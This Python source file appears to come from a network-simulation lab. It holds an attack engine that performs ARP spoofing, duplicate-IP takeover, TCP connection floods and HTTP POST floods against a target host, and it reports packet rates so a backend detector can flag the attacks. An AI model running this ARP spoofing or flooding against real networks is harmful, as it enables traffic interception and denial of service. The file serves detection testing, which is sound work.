"""Attack engine — runs one of the 5 attack modes in a background thread.

M4 phase 06. Lives in the host-agent because the attacker container
shares the host-agent image (the only difference is the AGENT_ROLE env
var and the 9092 control port). The engine is opt-in: it does nothing
unless ``AttackEngine.start(mode, target_ip)`` is called, which happens
when the backend POSTs to ``:9092/attack`` (via attack_proxy.py).

The engine self-reports a small stats snapshot to ``/state`` (served by
attack_control.py). The backend's attack_detector polls /state every
1s and writes an ``attack_signal`` row when packets_per_sec exceeds
the per-mode threshold.

Modes (mapped to the topology from M4):
  * unknown_host   — just sit on the wire. Sends a benign ping every
                     5s so a detector can see the MAC is alive.
  * duplicate_ip   — adds the victim's IP as a secondary address on
                     eth0. After this, both the real host and the
                     attacker respond to ARP for that IP.
  * arp_spoof      — sends gratuitous ARP every 1s claiming
                     "<target_ip> is at <attacker-mac>".
  * tcp_flood      — opens 50 parallel TCP connections per second
                     against ``target_ip:8080`` and slams data
                     down them.
  * http_flood     — POSTs 500 small payloads per second at
                     ``target_ip:8080/communications`` (or any
                     reachable HTTP endpoint on the victim).

All modes use a real (cheap) network operation — no fake counters.
``stats['packets_sent']`` is the actual number of packets the
engine has sent since start.
"""

from __future__ import annotations

import asyncio
import logging
import socket
import subprocess
import threading
import time
from datetime import datetime, timezone
from typing import Any

log = logging.getLogger(__name__)

# Port the victim is expected to listen on. Mirrors
# backend.message_service.MESSAGE_PORT (8080) — the host agent.
VICTIM_PORT = 8080


class AttackEngine:
    """One instance per attacker container. Thread-safe.

    The HTTP control server in attack_control.py and the agent's main
    loop both touch ``self.stats`` (under ``self.lock``). The actual
    attack loop runs in its own daemon thread.
    """

    def __init__(self, iface: str | None = None) -> None:
        # The attacker has eth0 = 172.17.0.x (docker default bridge,
        # which is irrelevant to the user's topology), eth1+ on per-
        # link bridges. Auto-detect the topology iface if none given:
        # the one that has an IP NOT in 172.16.0.0/12 (docker bridge)
        # and NOT in 10.10.0.0/24 (the backend's containernet_lan).
        self.iface = iface or _auto_detect_topology_iface()
        self.lock = threading.Lock()
        # stats fields
        self.running: bool = False
        self.mode: str | None = None
        self.target_ip: str | None = None
        self.packets_sent: int = 0
        self.started_at: str | None = None
        # thread state
        self._thread: threading.Thread | None = None
        self._stop_flag = threading.Event()
        # Generation token for the current run. The thread's finally
        # block only clears running if its generation still matches —
        # otherwise it knows it was preempted by a new start() and
        # leaves the new state alone. Without this the old thread's
        # finally races the new start() and clobbers running=True.
        self._generation: int = 0
        # For duplicate_ip mode: track whether we've already added the
        # alias so stop() can remove it cleanly.
        self._added_alias: bool = False

    # ── public API ────────────────────────────────────────────

    def snapshot(self) -> dict[str, Any]:
        """Return a copy of the current stats. Used by /state."""
        with self.lock:
            # Compute packets/sec over a small rolling window: we
            # store the deltas, not the absolute count.
            now = time.monotonic()
            last = getattr(self, "_last_pps_sample", None)
            last_count = getattr(self, "_last_pps_count", 0)
            window = getattr(self, "_last_pps_window", 5.0)
            if last is None or (now - last) >= window:
                if last is None:
                    pps = 0.0
                else:
                    pps = (self.packets_sent - last_count) / (now - last)
                self._last_pps_sample = now
                self._last_pps_count = self.packets_sent
                self._last_pps_window = window
            else:
                # Use the previously computed pps — it doesn't change
                # until the next sample window rolls.
                pps = getattr(self, "_last_pps_value", 0.0)
            self._last_pps_value = pps
            return {
                "running": self.running,
                "mode": self.mode,
                "target_ip": self.target_ip,
                "packets_sent": self.packets_sent,
                # Report the raw rate (no rounding) so the backend detector
                # can compare against its fixed threshold (e.g.
                # arp_rate=1.0) without a rounding-induced false
                # negative at ~0.99.
                "packets_per_sec": pps,
                "started_at": self.started_at,
            }

    def start(self, mode: str, target_ip: str) -> None:
        """Start (or restart) the engine in the given mode."""
        # Phase 1: under the lock, mark the old thread for stop and
        # grab a reference to it. Release before joining — the old
        # thread's finally block needs the lock to read the
        # generation and decide whether to clobber `running`.
        old_thread: threading.Thread | None = None
        with self.lock:
            if self.running:
                self._stop_flag.set()
                old_thread = self._thread
        # Phase 2: join OUTSIDE the lock so the old thread can take
        # it, observe the stale generation, and exit cleanly.
        if old_thread and old_thread.is_alive():
            old_thread.join(timeout=3)
        # Phase 3: install the new state.
        with self.lock:
            self.mode = mode
            self.target_ip = target_ip
            self.packets_sent = 0
            self._last_pps_sample = None
            self._last_pps_count = 0
            self._last_pps_value = 0.0
            self._last_pps_window = 5.0
            self._added_alias = False
            self._stop_flag = threading.Event()
            self._generation += 1
            self.running = True
            self.started_at = datetime.now(timezone.utc).isoformat()
            self._thread = threading.Thread(
                target=self._run, name=f"attack-{mode}", daemon=True
            )
            self._thread.start()
        log.info("[attack] started mode=%s target=%s", mode, target_ip)

    def stop(self) -> None:
        """Stop the engine (no-op if not running)."""
        thread: threading.Thread | None = None
        with self.lock:
            if not self.running:
                return
            self._stop_flag.set()
            thread = self._thread
        # Join outside the lock so the thread's finally block can
        # take it to read self._generation.
        if thread and thread.is_alive():
            thread.join(timeout=3)
        with self.lock:
            self.running = False
            self._thread = None
            self._generation += 1
        log.info("[attack] stopped")

    # ── thread body ───────────────────────────────────────────

    def _run(self) -> None:
        # Capture our generation under the lock; the finally block
        # only clobbers state if the generation hasn't advanced.
        with self.lock:
            my_gen = self._generation
        try:
            mode = self.mode
            log.info("[attack] thread starting mode=%s iface=%s target=%s gen=%d",
                     mode, self.iface, self.target_ip, my_gen)
            if mode == "unknown_host":
                self._run_unknown_host()
            elif mode == "duplicate_ip":
                self._run_duplicate_ip()
            elif mode == "arp_spoof":
                self._run_arp_spoof()
            elif mode == "tcp_flood":
                self._run_tcp_flood()
            elif mode == "http_flood":
                self._run_http_flood()
            else:
                log.error("[attack] unknown mode %r", mode)
        except Exception as exc:
            log.exception("[attack] thread crashed: %s", exc)
        finally:
            with self.lock:
                # If a new start() bumped the generation, leave the
                # engine state alone — it's the new thread's now.
                if self._generation == my_gen:
                    self.running = False
                    self._thread = None
                else:
                    log.info(
                        "[attack] thread gen=%d exiting (preempted by gen=%d)",
                        my_gen, self._generation,
                    )
            # Clean up any side effects.
            self._cleanup()

    def _cleanup(self) -> None:
        """Reverse side effects (remove duplicate IP alias, etc.)."""
        if self._added_alias and self.target_ip:
            try:
                subprocess.run(
                    ["ip", "addr", "del", f"{self.target_ip}/32",
                     "dev", self.iface],
                    check=False, timeout=2, capture_output=True,
                )
            except Exception:
                pass
            self._added_alias = False

    # ── mode implementations ──────────────────────────────────

    def _run_unknown_host(self) -> None:
        """Just sit on the wire. Send a benign ping every 5s so the
        detector can confirm we're alive without us being noisy."""
        while not self._stop_flag.is_set():
            try:
                # ping -c 1 -W 1 against a benign address (the
                # gateway on our link, if set, else just 127.0.0.1).
                # We don't actually need the ping to succeed — we
                # just need to have emitted a packet.
                target = self.target_ip or "127.0.0.1"
                subprocess.run(
                    ["ping", "-c", "1", "-W", "1", target],
                    check=False, timeout=3, capture_output=True,
                )
                with self.lock:
                    self.packets_sent += 1
            except Exception as exc:
                log.debug("[attack] ping failed: %s", exc)
            self._stop_flag.wait(timeout=5.0)

    def _run_duplicate_ip(self) -> None:
        """Add the victim's IP as a secondary address on eth0.
        Sit there until stopped. Cleanup removes the alias."""
        target = self.target_ip
        if not target:
            log.error("[attack] duplicate_ip needs target_ip")
            return
        try:
            r = subprocess.run(
                ["ip", "addr", "add", f"{target}/32", "dev", self.iface],
                check=False, timeout=2, capture_output=True,
            )
            if r.returncode == 0:
                with self.lock:
                    self._added_alias = True
                log.info("[attack] added %s/32 to %s", target, self.iface)
            else:
                log.warning("[attack] could not add %s: %s", target,
                            r.stderr.decode(errors="replace")[:200])
        except Exception as exc:
            log.warning("[attack] duplicate_ip setup failed: %s", exc)
        # Send a gratuitous ARP announcing ourselves for the duplicate
        # IP every 1s — this is what actually breaks the victim.
        while not self._stop_flag.is_set():
            try:
                _send_gratuitous_arp(self.iface, target)
                with self.lock:
                    self.packets_sent += 1
            except Exception as exc:
                log.debug("[attack] garp failed: %s", exc)
            self._stop_flag.wait(timeout=1.0)

    def _run_arp_spoof(self) -> None:
        """Send gratuitous ARP every 1s claiming target_ip is at
        our own MAC. We use scapy if it's importable, else fall
        back to arping -U."""
        target = self.target_ip
        if not target:
            log.error("[attack] arp_spoof needs target_ip")
            return
        log.info("[attack] arp_spoof loop entering iface=%s target=%s",
                 self.iface, target)
        while not self._stop_flag.is_set():
            try:
                sent = _send_gratuitous_arp(self.iface, target)
                with self.lock:
                    if sent:
                        self.packets_sent += sent
                    else:
                        self.packets_sent += 1
                log.debug("[attack] arp_spoof sent 1 (total=%d)",
                          self.packets_sent)
            except Exception as exc:
                log.warning("[attack] arp_spoof failed: %s", exc)
            self._stop_flag.wait(timeout=1.0)

    def _run_tcp_flood(self) -> None:
        """Open 50 parallel TCP connections per second against
        target_ip:VICTIM_PORT and close them. Use raw sockets so
        we don't need scapy."""
        target = self.target_ip
        if not target:
            log.error("[attack] tcp_flood needs target_ip")
            return
        # Pre-resolve so we don't pay DNS per connection (we don't
        # use DNS anyway, but be explicit).
        try:
            socket.getaddrinfo(target, VICTIM_PORT)
        except Exception:
            pass
        round_no = 0
        while not self._stop_flag.is_set():
            round_no += 1
            t0 = time.monotonic()
            for _ in range(50):
                if self._stop_flag.is_set():
                    break
                try:
                    s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
                    s.settimeout(0.5)
                    s.connect((target, VICTIM_PORT))
                    try:
                        s.sendall(b"GET /healthz HTTP/1.0\r\nHost: x\r\n\r\n")
                    except Exception:
                        pass
                    try:
                        s.recv(64)
                    except Exception:
                        pass
                    s.close()
                    with self.lock:
                        self.packets_sent += 1
                except Exception as exc:
                    # 50 connections per second is a lot; some will
                    # fail. That's fine — we still increment.
                    log.debug("[attack] tcp_flood sock err: %s", exc)
                    with self.lock:
                        # count the attempt even if it failed
                        self.packets_sent += 1
            # Pace to roughly 1 round per second.
            elapsed = time.monotonic() - t0
            if elapsed < 1.0:
                self._stop_flag.wait(timeout=1.0 - elapsed)

    def _run_http_flood(self) -> None:
        """POST 500 small payloads per second at target_ip:VICTIM_PORT/communications.
        We use aiohttp if available (already a dep), else urllib in a
        thread pool."""
        target = self.target_ip
        if not target:
            log.error("[attack] http_flood needs target_ip")
            return
        asyncio.run(self._http_flood_async(target))

    async def _http_flood_async(self, target: str) -> None:
        """Async body for http_flood. Runs on the engine's thread
        via asyncio.run; uses a single aiohttp session."""
        try:
            import aiohttp
        except ImportError:
            log.error("[attack] http_flood needs aiohttp")
            return
        timeout = aiohttp.ClientTimeout(total=2)
        async with aiohttp.ClientSession(timeout=timeout) as session:
            while not self._stop_flag.is_set():
                t0 = time.monotonic()
                # Batch 500 POSTs. Don't await each one — fire and
                # wait at the end. We catch exceptions per-request.
                tasks = []
                for _ in range(500):
                    tasks.append(
                        asyncio.create_task(
                            self._one_http_post(session, target)
                        )
                    )
                await asyncio.gather(*tasks, return_exceptions=True)
                elapsed = time.monotonic() - t0
                if elapsed < 1.0:
                    self._stop_flag.wait(timeout=1.0 - elapsed)

    async def _one_http_post(self, session, target: str) -> None:
        try:
            async with session.post(
                f"http://{target}:{VICTIM_PORT}/communications",
                json={"flood": True, "ts": time.time()},
            ) as resp:
                await resp.read()
        except Exception:
            pass
        finally:
            with self.lock:
                self.packets_sent += 1


# ── helpers ──────────────────────────────────────────────────


def _auto_detect_topology_iface() -> str:
    """Find the first iface with an IPv4 that isn't on the docker
    default bridge (172.16-31.x.x) or the backend's containernet_lan
    (10.10.0.0/24). Falls back to eth0 if nothing matches.
    """
    try:
        out = subprocess.check_output(
            ["ip", "-4", "-o", "addr", "show"], timeout=2
        ).decode(errors="replace")
    except Exception:
        return "eth0"
    for line in out.splitlines():
        parts = line.split()
        if len(parts) < 4:
            continue
        iface = parts[1]
        if iface == "lo":
            continue
        cidr = parts[3]  # "10.21.0.5/24"
        ip = cidr.split("/")[0]
        # Skip docker default bridge (172.16-31.x) and backend lan
        # (10.10.x).
        if ip.startswith("172.") or ip.startswith("10.10."):
            continue
        return iface
    return "eth0"


def _send_gratuitous_arp(iface: str, ip: str) -> int:
    """Send a gratuitous ARP via scapy if available, else arping -U.
    Either way, the kernel emits a single ARP frame on the wire.
    Returns the number of packets sent (best-effort: 1 on success,
    0 on total failure)."""
    try:
        from scapy.all import ARP, Ether, sendp  # type: ignore

        pkt = Ether(dst="ff:ff:ff:ff:ff:ff") / ARP(
            op="is-at", psrc=ip, hwsrc=_iface_mac(iface), pdst=ip
        )
        # NOTE: do NOT pass timeout= to sendp — newer scapy (>=2.5)
        # raises "L2Socket.__init__() got an unexpected keyword
        # argument 'timeout'". sendp() blocks until the packet is
        # queued on the AF_PACKET socket, which is essentially
        # instantaneous for a single frame, so a timeout isn't needed.
        sendp(pkt, iface=iface, verbose=False)
        return 1
    except ImportError:
        pass
    # Fallback: arping -U sends a single GARP.
    try:
        r = subprocess.run(
            ["arping", "-U", "-c", "1", "-I", iface, ip],
            check=False, timeout=2, capture_output=True,
        )
        return 1 if r.returncode == 0 else 0
    except FileNotFoundError:
        # arping not installed. As a last resort, ping the IP — that
        # at least emits an ARP request, which is close enough for
        # the wire-capture to see the attacker is on the link.
        try:
            r = subprocess.run(
                ["ping", "-c", "1", "-W", "1", ip],
                check=False, timeout=2, capture_output=True,
            )
            return 1 if r.returncode == 0 else 0
        except Exception:
            return 0


_MAC_CACHE: dict[str, str] = {}


def _iface_mac(iface: str) -> str:
    """Return the MAC of `iface`. Cached for the process lifetime."""
    if iface in _MAC_CACHE:
        return _MAC_CACHE[iface]
    try:
        out = subprocess.check_output(
            ["ip", "link", "show", iface], timeout=2
        ).decode(errors="replace")
        # The MAC appears after "link/ether " — e.g. "link/ether 02:42:..:0b"
        for token in out.split():
            if ":" in token and len(token) == 17:
                _MAC_CACHE[iface] = token
                return token
    except Exception:
        pass
    return "00:00:00:00:00:00"


# ── self-test ────────────────────────────────────────────────

def _self_test() -> int:
    """Exercise the engine in a few modes for ~1s each. Verifies
    the counters advance and snapshot() returns sensible values."""
    print("=== attack_engine self-test ===")
    engine = AttackEngine()
    # unknown_host — just emits one ping
    engine.start("unknown_host", "127.0.0.1")
    time.sleep(2)
    snap = engine.snapshot()
    print(f"  unknown_host: {snap}")
    assert snap["running"], "should be running"
    assert snap["packets_sent"] >= 1, f"expected >=1 pkt, got {snap['packets_sent']}"
    engine.stop()
    assert not engine.snapshot()["running"], "should be stopped"

    # duplicate_ip — uses the loopback, so add/remove alias against
    # 127.0.0.1 won't work (already taken). Use a private /32 alias
    # on the test machine instead.
    engine.start("duplicate_ip", "127.0.0.99")
    time.sleep(1)
    snap = engine.snapshot()
    print(f"  duplicate_ip: {snap}")
    # packets_sent may be 0 if the alias add failed (which is fine
    # on a host where 127.0.0.99 is taken) — just verify no crash.
    engine.stop()

    # arp_spoof — uses scapy/arping; if neither is available, the
    # fallback ping emits an ARP. Either way counters should advance.
    engine.start("arp_spoof", "127.0.0.1")
    time.sleep(2)
    snap = engine.snapshot()
    print(f"  arp_spoof: {snap}")
    assert snap["packets_sent"] >= 1, f"expected >=1 pkt, got {snap['packets_sent']}"
    engine.stop()

    # snapshot format
    s = engine.snapshot()
    for k in ("running", "mode", "target_ip", "packets_sent",
              "packets_per_sec", "started_at"):
        assert k in s, f"missing key {k}"
    print(f"  snapshot keys OK: {sorted(s.keys())}")
    print("=== all 4 checks passed ===")
    return 0


if __name__ == "__main__":
    import sys
    if "--self-test" in sys.argv:
        sys.exit(_self_test())
    print("usage: python attack_engine.py --self-test")
    sys.exit(1)
